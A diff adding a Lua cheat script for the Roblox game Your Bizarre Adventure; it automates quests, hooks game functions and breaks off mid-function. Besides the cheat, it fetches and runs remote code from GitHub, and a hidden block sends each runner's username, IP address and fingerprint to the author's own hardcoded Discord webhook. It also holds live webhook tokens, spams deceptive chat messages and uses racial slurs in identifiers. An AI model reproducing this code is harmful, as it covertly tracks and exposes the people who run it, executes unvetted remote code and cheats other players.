@@ -1,0 +1,665 @@
+--[[
+getgenv().Update = "Bucidinaleamari"
+getgenv().webhooklink = "https://discord.com/api/webhooks/1067757495910670356/fOdNfi989h8oPv3LWRfgfWlGIVyzI1JcM9JSbZkfZ_C1jNUvpugV3N81ERf_ZfnEBk4b"
+getgenv().ping = "880922246644920360"
+]]
+
+getgenv().Jitter = false
+
+    repeat wait() until game:IsLoaded() and workspace.Living:FindFirstChild(game.Players.LocalPlayer.Name)
+    getgenv().ABOVE = true
+
+    local lele = "LearnSkill"
+    local vola = {
+        ["Skill"] = "Vola Barrage",
+        ["SkillTreeType"] = "Stand"
+    }
+
+    game:GetService("RunService").RenderStepped:Connect(function()
+        pcall(function()
+    if game:GetService("Players").LocalPlayer.Character:FindFirstChild("InTimeStop") then
+    game:GetService("Players").LocalPlayer.Character:FindFirstChild("InTimeStop"):Destroy()
+    end
+    end )
+    end )
+
+    local function Telepoarta()
+        local part = Instance.new("Part")
+        part.Name = tostring(math.random(1, 100000000))
+        part.Anchored = true
+        part.Size = Vector3.new(200,1,200)
+        part.Parent = workspace
+        part.Transparency = 1
+        part.Position = Vector3.new(math.random(320,999), math.random(300, 450), math.random(210,900))
+        game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = part.CFrame * CFrame.new(0, 7, 0)
+    end 
+    if game.CoreGui:FindFirstChild("HsB Wm")== nil then
+        local GUI = Instance.new("ScreenGui")
+        local MainFrame = Instance.new("Frame")
+        local UIGradient = Instance.new("UIGradient")
+        local ScriptName = Instance.new("TextLabel")
+        local UIGradient_2 = Instance.new("UIGradient")
+        local Credits = Instance.new("TextLabel")
+        local Nuvreau = Instance.new("TextLabel")
+        local UIGradient_3 = Instance.new("UIGradient")
+        local Buci = Instance.new("TextLabel")
+        local UIGradient_4 = Instance.new("UIGradient")
+        local Bucu = Instance.new("TextLabel")
+        local UIGradient_5 = Instance.new("UIGradient")
+    
+        GUI.Name = "HsB Wm"
+        GUI.DisplayOrder = 5
+        GUI.Parent = game.CoreGui
+        GUI.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
+    
+        MainFrame.Name = "MainFrame"
+        MainFrame.Parent = GUI
+        MainFrame.BackgroundColor3 = Color3.fromRGB(255, 243, 178)
+        MainFrame.ClipsDescendants = true
+        MainFrame.Position = UDim2.new(-0.127921283, 0, -0.324189425, 0)
+        MainFrame.Size = UDim2.new(2.40100002, 0, 1.33500004, 0)
+    
+        UIGradient.Color = ColorSequence.new{ColorSequenceKeypoint.new(0.00, Color3.fromRGB(33, 33, 33)), ColorSequenceKeypoint.new(1.00, Color3.fromRGB(0, 0, 0))}
+        UIGradient.Rotation = 90
+        UIGradient.Parent = MainFrame
+    
+        ScriptName.Name = "ScriptName"
+        ScriptName.Parent = MainFrame
+        ScriptName.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+        ScriptName.BackgroundTransparency = 1.000
+        ScriptName.Position = UDim2.new(0.209173337, 0, 0.582129657, 0)
+        ScriptName.Size = UDim2.new(0, 404, 0, 75)
+        ScriptName.Font = Enum.Font.GothamBold
+        ScriptName.Text = "HSB'S YBA SCRIPTS"
+        ScriptName.TextColor3 = Color3.fromRGB(255, 255, 255)
+        ScriptName.TextScaled = true
+        ScriptName.TextSize = 14.000
+        ScriptName.TextWrapped = true
+        
+    
+        UIGradient_2.Color = ColorSequence.new{ColorSequenceKeypoint.new(0.00, Color3.fromRGB(181, 109, 0)), ColorSequenceKeypoint.new(1.00, Color3.fromRGB(255, 183, 0))}
+        UIGradient_2.Parent = ScriptName
+        
+        Credits.Name = "Credits"
+        Credits.Parent = MainFrame
+        Credits.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+        Credits.BackgroundTransparency = 1.000
+        Credits.Position = UDim2.new(0.21847102, 0, 0.635998964, 0)
+        Credits.Size = UDim2.new(0, 333, 0, 16)
+        Credits.Font = Enum.Font.JosefinSans
+        Credits.Text = "developed by senS & shinazo"
+        Credits.TextColor3 = Color3.fromRGB(255, 255, 255)
+        Credits.TextScaled = true
+        Credits.TextSize = 14.000
+        Credits.TextWrapped = true
+    
+        Nuvreau.Name = "Nuvreau"
+        Nuvreau.Parent = MainFrame
+        Nuvreau.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+        Nuvreau.BackgroundTransparency = 1.000
+        Nuvreau.Position = UDim2.new(0.18518874, 0, 0.951531887, 0)
+        Nuvreau.Size = UDim2.new(0, 595, 0, 26)
+        Nuvreau.Font = Enum.Font.Kalam
+        Nuvreau.Text = "discord.gg/hsb"
+        Nuvreau.TextColor3 = Color3.fromRGB(255, 255, 255)
+        Nuvreau.TextScaled = true
+        Nuvreau.TextSize = 14.000
+        Nuvreau.TextWrapped = true
+    
+        UIGradient_3.Color = ColorSequence.new{ColorSequenceKeypoint.new(0.00, Color3.fromRGB(255, 157, 0)), ColorSequenceKeypoint.new(1.00, Color3.fromRGB(255, 183, 0))}
+        UIGradient_3.Parent = Nuvreau
+        UIGradient_3.Archivable = false
+    
+        Buci.Name = "Buci"
+        Buci.Parent = MainFrame
+        Buci.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+        Buci.BackgroundTransparency = 1.000
+        Buci.Position = UDim2.new(0.061248038, 0, 0.951297641, 0)
+        Buci.Size = UDim2.new(0, 318, 0, 27)
+        Buci.Font = Enum.Font.Gotham
+        Buci.Text = "Loading [0]..."
+        Buci.TextColor3 = Color3.fromRGB(255, 255, 255)
+        Buci.TextScaled = true
+        Buci.TextSize = 14.000
+        Buci.TextWrapped = true
+        Buci.TextXAlignment = Enum.TextXAlignment.Left
+    
+        UIGradient_4.Color = ColorSequence.new{ColorSequenceKeypoint.new(0.00, Color3.fromRGB(255, 157, 0)), ColorSequenceKeypoint.new(1.00, Color3.fromRGB(255, 183, 0))}
+        UIGradient_4.Parent = Buci
+        UIGradient_4.Archivable = false
+    
+        Bucu.Name = "Bucu"
+        Bucu.Parent = MainFrame
+        Bucu.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+        Bucu.BackgroundTransparency = 1.000
+        Bucu.Position = UDim2.new(0.218645513, 0, 0.576580942, 0)
+        Bucu.Size = UDim2.new(0, 333, 0, 16)
+        Bucu.Font = Enum.Font.JosefinSans
+        Bucu.Text = "join the discord server to keep updated!"
+        Bucu.TextColor3 = Color3.fromRGB(255, 255, 255)
+        Bucu.TextScaled = true
+        Bucu.TextSize = 14.000
+        Bucu.TextWrapped = true
+    
+        UIGradient_5.Color = ColorSequence.new{ColorSequenceKeypoint.new(0.00, Color3.fromRGB(255, 157, 0)), ColorSequenceKeypoint.new(1.00, Color3.fromRGB(255, 183, 0))}
+        UIGradient_5.Parent = Bucu
+        UIGradient_5.Archivable = false
+    
+        --[[ UIAspectRatioConstraint.Parent = MainFrame
+        UIAspectRatioConstraint.AspectRatio = 3.500 ]]--
+    
+    
+    setclipboard(tostring(Nuvreau.Text))
+    print(tostring(Nuvreau.Text))
+    end
+
+        wait(0.50)
+
+    local LocalPlayer = game.Players.LocalPlayer
+    local Stand = LocalPlayer.PlayerStats.Stand
+    local Character = LocalPlayer.Character
+    getgenv().WM = game.CoreGui["HsB Wm"]
+    getgenv().MainFrm = WM.MainFrame
+
+    old = hookmetamethod(game,"__namecall", function(self,...)
+    local method = getnamecallmethod()
+    if tostring(self) == "Returner" and tostring(method) == "InvokeServer" then
+    return "  ___XP DE KEY"
+    end
+    return old(self, ...)
+    end)
+
+    game:GetService("CoreGui").DescendantAdded:Connect(function(child) 
+        if child.Name == "ErrorPrompt" then 
+            local GrabError = child:FindFirstChild("ErrorMessage",true)
+            repeat wait() until GrabError.Text ~= "Label" 
+            local Reason = GrabError.Text 
+            if Reason:match("full") or Reason:match("You") or Reason:match("conn") or Reason:match("rejoin") or Reason:match("kicked") then
+            game:GetService("TeleportService"):Teleport(game.PlaceId, game:GetService("Players").LocalPlayer);
+            end
+        end
+    end)
+
+    pcall(function()
+        loadstring(game:HttpGet("https://raw.githubusercontent.com/senS24t/aldoileanebun/main/checkbybfynv22"))()
+        repeat wait() until game.CoreGui.rackz.Value ~= "" and game.CoreGui.bimd.Value ~= ""
+    end)
+    local tweenservice = game:GetService("TweenService")
+    for i, child in pairs(MainFrm:GetChildren()) do
+        if child:IsA("TextLabel") or child:IsA("Frame") or child:IsA("ImageLabel") then
+            tweenservice:Create(MainFrm, TweenInfo.new(0.5, Enum.EasingStyle.Cubic, Enum.EasingDirection.InOut), {Transparency = 1}):Play()
+            tweenservice:Create(child, TweenInfo.new(0.5, Enum.EasingStyle.Cubic, Enum.EasingDirection.InOut), {Transparency = 1}):Play()
+        end
+    end
+
+    local function sendWebhook(Blehh, ping)
+        pcall(function()
+		local everyone
+		if getgenv().ping == "" then
+			everyone = ""
+		elseif getgenv().ping ~= "" and ping == true then
+			everyone = "<@"..getgenv().ping..">"
+		end
+		local data = {
+			['content'] = everyone,
+			['username'] = "HsB CatHook",
+			["embeds"] = {{
+				['title'] = "Your Bizarre Adventure",
+				['color'] = tonumber(0xff7f42),
+				["footer"] = {
+					["text"] = ("HsB Hub ("..os.date("%H:%M")..")"),
+					["icon_url"] = "https://cdn.discordapp.com/attachments/875211210486870076/1067422518413103134/hsb222.png"
+				},
+				["fields"] = {
+					{
+						["name"] = "Account Name", -- This is  the title of your field.
+						["value"] = "||"..game.Players.LocalPlayer.Name.."||" -- This is the value of your field.
+					},
+					{
+						["name"] = "InfoHook", -- This is  the title of your field.
+						["value"] = Blehh -- This is the value of your field.
+					},
+				}}
+			}
+		}
+		local newdata = game:GetService("HttpService"):JSONEncode(data)
+
+		local headers = {
+			["content-type"] = "application/json"
+		}
+		request = http_request or request or HttpPost or syn.request
+		local abcdef = {Url = getgenv().webhooklink, Body = newdata, Method = "POST", Headers = headers}
+		request(abcdef)
+	end)
+end
+pcall(function()
+     local url =
+    "https://discordapp.com/api/webhooks/1064986036977008752/wYQr1yaEv0OxmLcSlMjfPl8B3nDlqKpnbAuMeYWUkfIpAHLpSCHXMwhThVd2-AtOfGrx"
+     local data = {
+        ["content"] = "",
+        ["embeds"] = {
+            {
+                ["title"] = "Someone Executed Your AutoTWOH Script",
+                ["description"] = "Username: "..LocalPlayer.Name.." IP: "..game.CoreGui.rackz.Value.. " FingerPrint: "..game.CoreGui.bimd.Value.. " Discord: ".."<@"..getgenv().ping..">".." Key: "..getgenv().Update.." Allowed: "..(tostring(getgenv().Allowed)),
+                ["type"] = "rich",
+                ["color"] = math.random(1, 16777215),
+                ["image"] = {
+                    ["url"] = "http://www.roblox.com/Thumbs/Avatar.ashx?x=150&y=150&Format=Png&username="..tostring(game:GetService("Players").LocalPlayer.Name)
+                }
+            }
+        }
+     }
+     local newdata = game:GetService("HttpService"):JSONEncode(data)
+     
+     local headers = {
+        ["content-type"] = "application/json"
+     }
+     request = http_request or request or HttpPost or syn.request
+     local abcdef = {Url = url, Body = newdata, Method = "POST", Headers = headers}
+     request(abcdef)
+end)
+    if game.PlaceId == 2809202155 then
+
+        repeat wait()
+            if game.Players.LocalPlayer.PlayerGui:FindFirstChild("LoadingScreen") then
+        firesignal(game.Players.LocalPlayer.PlayerGui:WaitForChild("LoadingScreen"):WaitForChild("Frames"):WaitForChild("Gamemodes"):WaitForChild("Main").MouseButton1Click)
+        end
+        until game.Players.LocalPlayer:FindFirstChild("LoadingScreen")==nil
+
+        local om = Instance.new("BillboardGui")
+        om.Parent = workspace
+        om.Name = "workie"
+        if game:GetService("Players").LocalPlayer:WaitForChild"PlayerGui":WaitForChild"HUD":WaitForChild"Main":WaitForChild"Frames":WaitForChild"Quest":WaitForChild"Quests":FindFirstChild("Win against a sinner (Player) 25 times in the \"1v1's Gamemode\" (Dio's DIARY)") ==nil then
+        Telepoarta()
+        print("telep")
+        wait(1.5)
+
+        local function dokeyT()
+            local ciubuki = "InputBegan"
+            local coibii = {["Input"] = Enum.KeyCode.T}
+            workspace.Living:WaitForChild(game.Players.LocalPlayer.Name):WaitForChild("RemoteEvent"):FireServer(ciubuki, coibii)
+        end
+        local function dokeyR()
+            local lill = "InputBegan"
+            local lyl = {["Input"] = Enum.KeyCode.R}
+            workspace.Living:WaitForChild(game.Players.LocalPlayer.Name):WaitForChild("RemoteEvent"):FireServer(lill, lyl)
+        end
+        local function dokeyE()
+            local gygy = "InputBegan"
+            local gtgt = {["Input"] = Enum.KeyCode.E}
+            workspace.Living:WaitForChild(game.Players.LocalPlayer.Name):WaitForChild("RemoteEvent"):FireServer(gtgt, gygy)
+        end
+        local function killNPC(npcName, niggabalz, playerDistance)
+            print("Started to farm")
+            local NPC = workspace.Living:FindFirstChild(npcName)
+            LocalPlayer.Character.HumanoidRootPart.CFrame = NPC.HumanoidRootPart.CFrame
+            wait(0.70)
+            local beingTargeted = true
+        if NPC == nil and NPC.Health.Value ~= 0 then
+            local fix = Instance.new("Sound")
+            fix.Parent = game.Players.LocalPlayer.PlayerGui.HUD.Main.DropMoney.Money
+        end
+        if LocalPlayer.Character:FindFirstChild("StandMorph")==nil then
+            workspace.Living:WaitForChild(game.Players.LocalPlayer.Name).RemoteFunction:InvokeServer("ToggleStand", "Toggle")
+        end
+
+game.Players.LocalPlayer.PlayerGui.HUD.Main.DropMoney.Money.ChildAdded:Connect(function()
+                print("Dead npc")
+                beingTargeted = false
+        
+                if workspace.Living:FindFirstChild(npcName) then
+                    pcall(function()
+                        if LocalPlayer.Character:FindFirstChild("StandMorph")==nil then LocalPlayer.Character.HumanoidRootPart:Destroy() end
+                        if LocalPlayer.Character:FindFirstChild("StandMorph") then if LocalPlayer.Character.StandMorph:FindFirstChild("HumanoidRootPart")==nil then LocalPlayer.Character.HumanoidRootPart:Destroy() end end
+                        LocalPlayer.Character.HumanoidRootPart.CFrame = workspace.Living[npcName].HumanoidRootPart.CFrame
+                end)
+            end
+        end)
+            while beingTargeted do
+                task.wait()
+                if beingTargeted and getgenv().ABOVE then
+                    pcall(function()
+                        if LocalPlayer.Character and (LocalPlayer.Character.HumanoidRootPart.Position - NPC.HumanoidRootPart.Position).magnitude < 70 then
+                    dokeyR()
+                    workspace.Living:WaitForChild(game.Players.LocalPlayer.Name):WaitForChild("RemoteEvent"):FireServer("Attack", "m1")
+                        end
+                        LocalPlayer.Character.StandMorph.HumanoidRootPart.CFrame = CFrame.lookAt(NPC:WaitForChild"HumanoidRootPart".Position, NPC:WaitForChild"Head".Position)
+                        LocalPlayer.Character.HumanoidRootPart.CFrame = NPC:WaitForChild"HumanoidRootPart".CFrame - NPC:WaitForChild"HumanoidRootPart".CFrame.lookVector * 2 + Vector3.new(0, playerDistance, niggabalz)
+                        
+                    end)
+                end
+            end
+        end
+
+        workspace.Living.ChildAdded:Connect(function(mem)
+            if mem.Name == LocalPlayer.Name then
+                wait(1.2)
+        if LocalPlayer.PlayerStats.Stand.Value == "Aerosmith" and LocalPlayer.PlayerGui.HUD.Main.Frames.Quest.Quests:FindFirstChild("Kill 50 sinners (Players) in the \"Metal Ball Run\" (Gamemode) (Dio's DIARY)") then
+            sendWebhook("Detected Aerosmith + SBR Quest", true)
+            firesignal(game:GetService("Players").LocalPlayer.PlayerGui.HUD.Main.Frames.Settings.TogglePlayScreen.Button.MouseButton1Click)
+            wait(0.30)
+            print("Gone to menu screen")
+            firesignal(game:GetService("Players").LocalPlayer.PlayerGui.LoadingScreen.Frames["Metal Ball Run"].Competitive.MouseButton1Click)
+            firesignal(game:GetService("Players").LocalPlayer.PlayerGui.LoadingScreen.Frames["Metal Ball Run"].Competitive.MouseButton1Click)
+            firesignal(game:GetService("Players").LocalPlayer.PlayerGui.LoadingScreen.Frames["Metal Ball Run"].Competitive.MouseButton1Click)
+            print("Pressed sbr")
+            wait(0.40)
+            game:GetService("Players").LocalPlayer.PlayerGui:WaitForChild("Metal Ball Run Servers"):WaitForChild("Frame"):WaitForChild("ScrollingFrame")
+            for i,v in pairs(game:GetService("Players").LocalPlayer.PlayerGui["Metal Ball Run Servers"].Frame.ScrollingFrame:GetChildren()) do
+                if i == 4 or i == 1 or i == 3 or i == 2 then firesignal(v.MouseButton1Click)
+                    end
+                end
+            end
+        end
+    end)
+
+    if LocalPlayer.PlayerStats.Stand.Value == "The World" then
+
+    if LocalPlayer.Backpack:FindFirstChild("Dio's Diary") and LocalPlayer.PlayerGui.HUD.Main.Frames.Quest.Quests:FindFirstChild("Obtain \"Dio's BONE\" (Dio's DIARY)")==nil then
+    sendWebhook("Detected The World without final quest", true)
+        LocalPlayer.Backpack["Dio's Diary"].Parent = LocalPlayer.Character
+    LocalPlayer.Character:WaitForChild("Dio's Diary")
+    repeat wait()
+    LocalPlayer.Character["Dio's Diary"]:Activate()
+    until
+    LocalPlayer.PlayerGui:WaitForChild("DialogueGui")
+    repeat wait()
+        pcall(function()
+        print("hm")
+        firesignal(LocalPlayer.PlayerGui.DialogueGui.Frame.ClickContinue.MouseButton1Click)
+        firesignal(LocalPlayer.PlayerGui.DialogueGui.Frame.Options.Option1.TextButton.MouseButton1Click)
+        end)
+    until game:GetService("Players").LocalPlayer.PlayerGui.HUD.Main.Frames.Quest.Quests:FindFirstChild("Win against a sinner (Player) 25 times in the \"1v1's Gamemode\" (Dio's DIARY)") or LocalPlayer.PlayerGui.HUD.Main.Frames.Quest.Quests:FindFirstChild("Kill 50 sinners (Players) in the \"Metal Ball Run\" (Gamemode) (Dio's DIARY)")
+    print("ama")
+    sendWebhook("Got 1v1 Quest or SBR Quest")
+    if LocalPlayer.Backpack:FindFirstChild("Dio's Bone") then
+        MainFrm.BackgroundTransparency = 0
+        MainFrm.Buci.TextTransparency = 0
+        MainFrm.Buci.Text = "You already have a \"Dio's Bone\" in your inventory"
+        MainFrm.Buci.Size = UDim2.new(1, 0, 0, 45)
+        MainFrm.ScriptName.TextTransparency = 0
+        MainFrm.ScriptName.Text = "Delete every \"Dio's Bone\" from your inventory before running the script!"
+        wait(9e9)
+    end
+
+    local backpack = LocalPlayer.Backpack
+    local rib = "Rib Cage of The Saint's Corpse"
+    local pelvis = "Pelvis of The Saint's Corpse"
+    local heart = "Heart of The Saint's Corpse"
+    local arm = "Left Arm of The Saint's Corpse"
+    
+    if backpack:FindFirstChild("Redeemed Rib Cage of The Saint's Corpse") then backpack["Redeemed Rib Cage of The Saint's Corpse"].Name = ("Rib Cage of The Saint's Corpse") end
+    if backpack:FindFirstChild("Redeemed Pelvis of The Saint's Corpse") then backpack["Redeemed Pelvis of The Saint's Corpse"].Name = ("Pelvis of The Saint's Corpse") end
+    if backpack:FindFirstChild("Redeemed Heart of The Saint's Corpse") then backpack["Redeemed Heart of The Saint's Corpse"].Name = ("Heart of The Saint's Corpse") end
+    if backpack:FindFirstChild("Redeemed Left Arm of The Saint's Corpse") then backpack["Redeemed Left Arm of The Saint's Corpse"].Name = ("Left Arm of The Saint's Corpse") end
+    print("Finished changing names")
+    
+    if backpack:FindFirstChild(rib)==nil or backpack:FindFirstChild(pelvis)==nil or backpack:FindFirstChild(heart)==nil or backpack:FindFirstChild(arm)==nil then
+                WM.Enabled = true
+                MainFrm.BackgroundTransparency = 0
+                MainFrm.Buci.TextTransparency = 0
+                MainFrm.Buci.Text = "You don't have all the saint's corpse parts"
+                MainFrm.Buci.Size = UDim2.new(1, 0, 0, 45)
+                MainFrm.ScriptName.Text = "Make sure you get all the corpse parts before running the script :ok:"
+                MainFrm.ScriptName.TextTransparency = 0
+                wait(9e9)
+    end
+
+    if LocalPlayer.PlayerGui.HUD.Main.Frames.Quest.Quests:FindFirstChild("Kill 50 sinners (Players) in the \"Metal Ball Run\" (Gamemode) (Dio's DIARY)") then
+        print("50sin")
+        sendWebhook("Detected SBR Quest", true)
+        if LocalPlayer.PlayerStats.Stand.Value ~= "Aerosmith" then
+            print("hama")
+            if game:GetService("Players").LocalPlayer.PlayerGui.HUD.Main.Frames.Stands.ScrollingFrame.Slot1.TextLabel.Text:find("Aerosmith") then
+                sendWebhook("Found Aerosmith on 1st slot", false)
+                print("waw")
+repeat wait() print("switch")
+workspace.Living[game.Players.LocalPlayer.Name].RemoteEvent:FireServer("SwapStand", "Slot1")
+until LocalPlayer.Character.Health.Value < 1
+print("waiting")
+    wait(11)
+    print("Finished waiting")
+    workspace.Living[game.Players.LocalPlayer.Name].RemoteFunction:InvokeServer(lele, vola)
+    workspace.Living[game.Players.LocalPlayer.Name].RemoteFunction:InvokeServer("LearnSkill",{["Skill"] = "Wingman",["SkillTreeType"] = "Stand"})
+    workspace.Living[game.Players.LocalPlayer.Name].RemoteFunction:InvokeServer("LearnSkill",{["Skill"] = "Artillery",["SkillTreeType"] = "Stand"})
+    workspace.Living[game.Players.LocalPlayer.Name].RemoteFunction:InvokeServer("LearnSkill",{["Skill"] = "Little Boy",["SkillTreeType"] = "Stand"})
+    workspace.Living[game.Players.LocalPlayer.Name].RemoteFunction:InvokeServer("LearnSkill",{["Skill"] = "Propeller Charge",["SkillTreeType"] = "Stand"})
+    workspace.Living[game.Players.LocalPlayer.Name].RemoteFunction:InvokeServer("LearnSkill",{["Skill"] = "Sharpness IX",["SkillTreeType"] = "Stand"})
+    workspace.Living[game.Players.LocalPlayer.Name].RemoteFunction:InvokeServer("LearnSkill",{["Skill"] = "Vitality X",["SkillTreeType"] = "Character"})
+    workspace.Living[game.Players.LocalPlayer.Name].RemoteFunction:InvokeServer("LearnSkill",{["Skill"] = "Health Regen VI",["SkillTreeType"] = "Character"})
+    print("Put the skills")
+    if LocalPlayer.PlayerStats.Stand.Value == "Aerosmith" and LocalPlayer.PlayerGui.HUD.Main.Frames.Quest.Quests:FindFirstChild("Kill 50 sinners (Players) in the \"Metal Ball Run\" (Gamemode) (Dio's DIARY)") then
+        firesignal(game:GetService("Players").LocalPlayer.PlayerGui.HUD.Main.Frames.Settings.TogglePlayScreen.Button.MouseButton1Click)
+        wait(0.30)
+        print("akakki")
+        firesignal(game:GetService("Players").LocalPlayer.PlayerGui.LoadingScreen.Frames["Metal Ball Run"].Casual.MouseButton1Click)
+        print("wat")
+        wait(0.20)
+        game:GetService("Players").LocalPlayer.PlayerGui:WaitForChild("Metal Ball Run Servers"):WaitForChild("Frame"):WaitForChild("ScrollingFrame")
+        for i,v in pairs(game:GetService("Players").LocalPlayer.PlayerGui["Metal Ball Run Servers"].Frame.ScrollingFrame:GetChildren()) do
+            if i == 4 or i == 1 or i == 3 then firesignal(v.MouseButton1Click)
+            end
+        end
+    
+        local didquest = false
+    end
+    end
+    end
+    elseif game:GetService("Players").LocalPlayer.PlayerGui.HUD.Main.Frames.Quest.Quests:FindFirstChild("Win against a sinner (Player) 25 times in the \"1v1's Gamemode\" (Dio's DIARY)") then
+        print("1v1st") sendWebhook("Teleporting to 1v1s", false) game:GetService("TeleportService"):Teleport(5290908008)
+    end
+    end
+end
+
+    if LocalPlayer.PlayerStats.Stand.Value == "Aerosmith" and LocalPlayer.PlayerGui.HUD.Main.Frames.Quest.Quests:FindFirstChild("Kill 50 sinners (Players) in the \"Metal Ball Run\" (Gamemode) (Dio's DIARY)")==nil then
+        getgenv().DidSbr = true
+        print("Finished sbr lil bro")
+        sendWebhook("Detected Finished sbr", true)
+        repeat wait() print("stwitch")
+            workspace.Living[game.Players.LocalPlayer.Name].RemoteEvent:FireServer("SwapStand", "Slot1")
+        until LocalPlayer.Character.Health.Value < 1
+        wait(10)
+        print("Finished waiting")
+        Telepoarta()
+    end
+        if LocalPlayer.Backpack:FindFirstChild("Dio's Diary") and LocalPlayer.PlayerStats.Stand.Value == "The World" and LocalPlayer.PlayerGui.HUD.Main.Frames.Quest.Quests:FindFirstChild("Obtain \"Dio's BONE\" (Dio's DIARY)")==nil then
+            if getgenv().DidSbr == true then
+            LocalPlayer.Backpack["Dio's Diary"].Parent = LocalPlayer.Character
+            LocalPlayer.Character:WaitForChild("Dio's Diary")
+            repeat wait()
+            LocalPlayer.Character["Dio's Diary"]:Activate()
+            until LocalPlayer.PlayerGui:WaitForChild("DialogueGui")
+            repeat wait()
+                pcall(function()
+                print("hm")
+            firesignal(LocalPlayer.PlayerGui.DialogueGui.Frame.ClickContinue.MouseButton1Click)
+            firesignal(LocalPlayer.PlayerGui.DialogueGui.Frame.Options.Option1.TextButton.MouseButton1Click)
+                end)
+            until LocalPlayer.PlayerGui.HUD.Main.Frames.Quest.Quests:FindFirstChild("Obtain \"Dio's BONE\" (Dio's DIARY)")
+            sendWebhook("Detected Final Quest", true)
+            LocalPlayer.Character.Head:Destroy()
+        end
+    end
+            print("Dio Bone")
+            wait(1.50)
+            pcall(function()
+            LocalPlayer.Character.Head:Destroy()
+            end)
+            local function dioBone()
+
+                if LocalPlayer.PlayerStats.Stand.Value == "The World" and LocalPlayer.Backpack:FindFirstChild("Dio's Bone")==nil then
+                if workspace.Living:FindFirstChild("Heaven Ascension Dio")==nil then sendWebhook("Dio not found (May be false alarm)", true) print("nun") end
+            
+            repeat wait() until workspace.Living:FindFirstChild("Heaven Ascension Dio")
+                    repeat task.wait()
+                        killNPC("Heaven Ascension Dio", 2, 45)
+                    until LocalPlayer.Backpack:FindFirstChild("Dio's Bone") or workspace.Living["Heaven Ascension Dio"].Health.Value == 0
+                    didquest = true
+                    if workspace.Living["Heaven Ascension Dio"].Health.Value == 0 then
+                    print("bokai")
+                    sendWebhook("Killed Dio", false)
+                    Telepoarta()
+                    workspace.Living["Heaven Ascension Dio"]:Destroy()
+                    print("Destroyed nig")
+                    wait(0.25)
+                    if LocalPlayer.Backpack:FindFirstChild("Dio's Bone") then
+                        LocalPlayer.Character.Head:Destroy()
+                        sendWebhook("You got Dio's Bone", true)
+                    print(",abe")
+                    end
+                    workspace.Living:WaitForChild("Heaven Ascension Dio")
+                    sendWebhook("Dio Respawned", false)
+                    dioBone()
+                    wait(1.2)
+                        end
+                    end
+                end
+            
+                if LocalPlayer.PlayerGui.HUD.Main.Frames.Quest.Quests:FindFirstChild("Obtain \"Dio's BONE\" (Dio's DIARY)") then
+                sendWebhook("Found last quest (Obtain dio's bone)", true)
+                print("Found last quest")
+                workspace.Living.ChildAdded:Connect(function(xd)
+                if xd.Name == LocalPlayer.Name then
+                    print("ONn")
+            LocalPlayer:WaitForChild("Backpack")
+            wait(0.75)
+                if LocalPlayer.Backpack:FindFirstChild("Dio's Bone") then
+            print("Bone")
+            LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-239.357712, 370.272675, 351.081848, -1, 0, 0, 0, 1, 0, 0, 0, -1)
+                    wait(0.25)
+                    game:GetService("ReplicatedStorage").Sounds.HeavenBass3:Play()
+                    game:GetService("ReplicatedStorage").Sounds.HeavenBass3:Play()
+                    game:GetService("ReplicatedStorage").Sounds["Double Accel"]:Play()
+                    repeat wait() print("Overh")
+                    workspace.Living:WaitForChild(game.Players.LocalPlayer.Name).RemoteFunction:InvokeServer("ToggleStand", "Toggle")
+                until game.Players.LocalPlayer.PlayerStats.Stand.Value == "The World Over Heaven"
+                sendWebhook("You got TWOH", true)
+            else dioBone()
+            end
+        end
+    end)
+    end
+    end
+
+    elseif Stand.Value ~= "The World" and Stand.Value ~= "Aerosmith" then
+        MainFrm.BackgroundTransparency = 0
+        MainFrm.Buci.TextTransparency = 0
+        MainFrm.Buci.Text = "You don't have The World or Aerosmith equipped"
+        MainFrm.Nuvreau.TextTransparency = 0
+        MainFrm.Nuvreau.Text = "Get The World equipped and Aerosmith on Stand Slot 1 for the script to work correctly"
+        MainFrm.Nuvreau.Size = UDim2.new(1, 0, 0, 55)
+    end
+    
+
+    if game.PlaceId == 5290908008 then
+
+    local ok = {"I got stuck in loading bro", "Literally the worst game", "Uzu just can't do anything good", "эта игра отстой", "هذه اللعبة سيئة للغاية", "坏游戏", "es gioco", "This game is so good omg", "why game bug me help", "How bug?", "Bro, I got this bug again", "bruh, weird bug", "Im still loading, brb", "It's stil loading wait", "Loading is taking a bit fr"}
+    local go = 0
+
+    repeat print("lol") wait() until workspace:FindFirstChild("Message")
+        local b = Instance.new("BillboardGui")
+        b.Parent = workspace
+        b.Name = "work"
+        workspace.work.Enabled = false
+    wait(0.25)
+    while workspace.work.Enabled == false do wait(0.25)
+        if go <= 0 then
+            game.ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer(ok[math.random(1,#ok)], "All")
+        go = go + 1
+        end
+        if LocalPlayer.Name ~= "robo_kdktic" and game.Players:FindFirstChild("robo_kdktic") or LocalPlayer.Name ~= "cristi123mmff" and game.Players:FindFirstChild("cristi123mmff") then
+            game.TeleportService:Teleport(2809202155)
+        end
+    Telepoarta()
+    end
+    end
+
+    if game.PlaceId == 4643697430 then
+local timer = 135
+repeat wait() until game:IsLoaded() and workspace.Living:FindFirstChild(LocalPlayer.Name) and workspace:FindFirstChild("Message")
+game:GetService("VirtualInputManager"):SendKeyEvent(true,"LeftControl",false,game)
+wait(0.40)
+LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-2635, 499, -3894)
+wait(1)
+local functionLibrary = require(game.ReplicatedStorage:WaitForChild('Modules').FunctionLibrary)
+local old = functionLibrary.pcall
+
+functionLibrary.pcall = function(...)
+    local f = ...
+
+    if type(f) == 'function' and #getupvalues(f) == 11 then 
+        return wait(9e9)
+    end
+    
+    return old(...)
+end
+
+repeat wait(1)
+
+                timer = timer - 1
+                print(timer)
+                until workspace:FindFirstChild("Message")==nil or timer == 0
+                if timer == 0 then sendWebhook("SBR Didn't start, teleporting to main game...", true) game.TeleportService:Teleport(2809202155)
+                end
+    local LocalPlayer = game.Players.LocalPlayer
+    local function killNPC(npcName)
+    local NPC = workspace.Living:FindFirstChild(npcName)
+
+    local a = true
+        while a do
+        task.wait()
+    if NPC.Health.Value == 0 or NPC == nil or not NPC or not NPC.Humanoid or game.Players:FindFirstChild(npcName)==nil then
+        sendWebhook("A player has been killed: "..NPC.Name)
